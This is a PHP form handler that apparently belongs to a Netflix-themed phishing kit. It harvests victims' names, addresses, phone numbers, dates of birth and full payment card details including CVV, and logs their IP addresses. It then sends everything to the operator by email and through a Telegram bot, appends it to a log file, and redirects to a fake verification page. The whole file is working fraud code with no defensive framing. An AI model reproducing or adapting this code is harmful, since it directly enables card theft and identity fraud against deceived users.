<?php
session_start(); // Start the session
require '../config.php';
$Cashout = getenv("REMOTE_ADDR");
$logFile = 'logs.txt';
$logEntry = "---- Netflix Personal Information $Cashout  ------\n";
$logEntry .= "Name: " .  $_POST['name'] . "\n";
$logEntry .= "Address : " .  $_POST['adresse'] . "\n";
$logEntry .= "City: " .  $_POST['ville'] . "\n";
$logEntry .= "zip code: " .  $_POST['zip'] . "\n";
$logEntry .= "Phone: " .  $_POST['tel'] . "\n";
$logEntry .= "Date of birth: " .  $_POST['dob'] . "\n";
$logEntry .= "----  Card details  ------\n";
$logEntry .= "CC: " .  $_POST['ccc'] . "\n";
$logEntry .= "EXP : " .  $_POST['exp'] . "\n";
$logEntry .= "CVV/CVC: " .  $_POST['cvc'] . "\n";
$logEntry .= "Name on card: " .  $_POST['titulaire'] . "\n";
$logEntry .= "-------------------------------\n";
$logEntry .= "IP: " .$Cashout. "\n";
$logEntry .= "----------💓 TELEGRAM  : @mr_coder_x1 💓----------------\n";
$logFile = '../logs.txt';
mail($email, "Netflix Fullz  $Cashout", $logEntry);
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $logEntry
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);



file_put_contents($logFile, $logEntry, FILE_APPEND);

function generateRandomString($length = 34) {
    return substr(str_shuffle(str_repeat('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length / 62))), 0, $length);
}
sleep(2);
// Store the random string in the session
$_SESSION['random_string'] = generateRandomString();
$randomNumber = $_SESSION['random_string'];
header("Location: ./verification.php?id=CVB6N38DCNTVTBCN3CBVBNV536BN39BR4V7T6BY7NZU");
